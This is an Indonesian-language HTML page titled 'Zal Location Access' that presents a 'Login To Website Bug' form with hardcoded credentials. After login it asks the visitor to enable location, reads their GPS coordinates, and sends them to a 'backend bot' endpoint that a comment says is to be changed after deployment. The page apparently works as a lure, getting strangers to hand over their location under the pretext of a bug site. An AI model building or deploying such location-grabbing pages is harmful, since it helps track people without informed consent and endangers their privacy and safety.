<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Zal Location Access</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      background: linear-gradient(145deg, #0e0e0e, #1c1c1c);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: #111;
      border: 1px solid silver;
      box-shadow: 0 0 25px rgba(255,255,255,0.2);
      padding: 40px;
      border-radius: 15px;
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    h1 {
      font-size: 28px;
      color: white;
      margin-bottom: 20px;
      text-shadow: 0 0 10px silver;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      background: #1e1e1e;
      border: 1px solid #888;
      border-radius: 8px;
      color: #fff;
      outline: none;
    }

    button {
      background: linear-gradient(145deg, silver, #aaa);
      color: #000;
      padding: 12px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
      width: 100%;
      margin-top: 20px;
    }

    button:hover {
      background: #fff;
      color: #000;
    }

    #lokasiBtn {
      display: none;
      background: linear-gradient(145deg, #ffffff, #d3d3d3);
      color: black;
    }

    .success {
      margin-top: 20px;
      color: lightgreen;
    }

    .warning {
      margin-top: 20px;
      color: orange;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Login To Website Bug</h1>
    <input type="text" id="username" placeholder="Username"/>
    <input type="password" id="password" placeholder="Password"/>
    <button onclick="login()">Login</button>

    <button id="lokasiBtn" onclick="getLocation()">Aktifkan Lokasi</button>

    <div id="result" class="success"></div>
  </div>

  <script>
    function login() {
      const user = document.getElementById("username").value;
      const pass = document.getElementById("password").value;

      if (user === "Free" && pass === "123") {
        document.getElementById("lokasiBtn").style.display = "block";
        document.getElementById("result").innerHTML = "‚úÖ Login Berhasil! Aktifkan lokasi untuk lanjut.";
      } else {
        document.getElementById("result").innerHTML = "‚ùå Username atau Password salah.";
        document.getElementById("result").className = "warning";
      }
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const lat = pos.coords.latitude;
            const long = pos.coords.longitude;
            document.getElementById("result").innerHTML = `üìç Lokasi berhasil diambil!<br>Lat: ${lat}<br>Long: ${long}`;

            // Kirim ke backend bot (ubah setelah deploy)
            fetch("http://localhost:8000/api/lokasi", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ latitude: lat, longitude: long })
            });
          },
          err => {
            document.getElementById("result").innerHTML = "‚ö†Ô∏è Izin lokasi ditolak atau gagal.";
            document.getElementById("result").className = "warning";
          }
        );
      } else {
        alert("‚ùå Browser tidak mendukung lokasi.");
      }
    }
  </script>

</body>
</html>
